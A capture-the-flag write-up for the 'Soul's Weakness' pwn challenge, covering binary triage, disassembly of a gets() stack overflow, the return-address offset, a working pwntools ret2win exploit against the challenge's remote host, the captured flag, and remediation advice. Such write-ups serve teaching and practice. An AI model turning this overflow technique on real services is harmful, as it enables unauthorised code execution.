# Soul's Weakness

**Event:** ByteMe CTF 26
**Category:** pwn
**Points:** 200
**Flag:** `OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}`

---

Verified live against the remote service on 2026-10-09 (see
`exploit.py REMOTE`).

## 1. Triage

```
$ file soul
soul: ELF 64-bit LSB executable, x86-64, ... dynamically linked ... not stripped

$ checksec --file=./soul
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK/IBT Enabled
```

Not stripped, No PIE → fixed addresses, and the symbol table hands us the
goal directly:

```
$ nm soul
00000000004011b6 T soul_stone     <-- "win"
00000000004011ee T vault         <-- called by main
0000000000401297 T main
                 U gets@GLIBC_2.2.5   <-- unpatchable
```

Two smoking guns at once: an unstripped `soul_stone` function and a call to
`gets()`. The story writes itself.

## 2. Static analysis

`main` just sets the `stdio` buffers to unbuffered and calls `vault`:

```
main:
  4012f9: call vault
```

`vault` prints the vault banner, reads a line with `gets` into a 0x20-byte
stack buffer, echoes it back, and returns:

```
vault:
  4011f6: sub  rsp, 0x20          ; 32-byte local buffer
  ...
  401227: lea  rax,[rip+...]      ; "Enter the secret to unlock the Soul Stone: "
  401256: call gets@plt           ; <-- UNBOUNDED read
  40125b: ...
  401271: call printf@plt         ; "Hello, %s!\n"
  401294: leave
  401295: ret
```

`gets` has no length limit, so the 32-byte buffer trivially overruns the
saved RBP and the saved return address. No canary, so there is nothing to
leak or preserve.

`soul_stone` is the target. It prints the unlock message and the flag:

```
soul_stone:
  4011c8: puts  "Soul Stone unlocked!" / flag
```

(The flag string is additionally visible with `strings soul` - the remote
served the exact same string, confirming the binary and the deployed
service match.)

## 3. Offset calculation

Standard x86-64 prologue: `push rbp; mov rbp,rsp; sub rsp,0x20`. The buffer
starts at `rbp-0x20`.

```
distance to saved RBP = 0x20 (32 bytes)
+ 8 bytes for saved RBP itself
= 40 bytes to reach the saved return address
```

So: `b'A' * 40 + p64(0x4011b6)`.

Alignment note: `soul_stone` begins with `endbr64; push rbp; mov rbp,rsp`
and calls `puts`, so if the libc `puts` implementation ever needed 16-byte
stack alignment at the call site we might need a leading `ret` gadget. It
does not matter here - `puts` was fine and the exploit worked first try
both local and remote.

## 4. Exploit

`exploit.py`:

```python
from pwn import *
context.arch = 'amd64'
HOST, PORT = '145.239.142.129', 1337
WIN = 0x4011b6
OFF = 0x20 + 8
io = remote(HOST, PORT)
io.recvuntil(b':')
io.sendline(b'A' * OFF + p64(WIN))
print(io.recvall(timeout=5).decode(errors='replace'))
```

Run: `python3 exploit.py REMOTE` (or `python3 exploit.py` for the local
run).

Remote output:

```
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<garbage>@!
The Soul Stone remains sealed...

[+] Soul Stone unlocked!
OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
```

The `AAAAAAAA...` echo is the 32 buffer bytes plus the two `A` bytes that
clobbered the low byte of saved RBP; the `ret` then jumps straight into
`soul_stone` (`0x4011b6` written little-endian shows up as the `\x11\x40` in
the echoed line).

## 5. Root cause

Return-address overwrite via `gets()` into a fixed 32-byte stack buffer,
with no stack canary and no PIE - a textbook ret2win.

## 6. Remediation

- Never use `gets()`; use `fgets(buf, sizeof buf, stdin)` or `getline`.
- Compile with `-fstack-protector-all` (canary) and `-fPIE -pie` (ASLR on
  the code segment) to raise the bar; keep NX/RELRO as-is or go Full RELRO.
- Keep the flag out of the client binary - read it from a server-side
  file/env so a leaked/strings'd binary cannot hand it over.
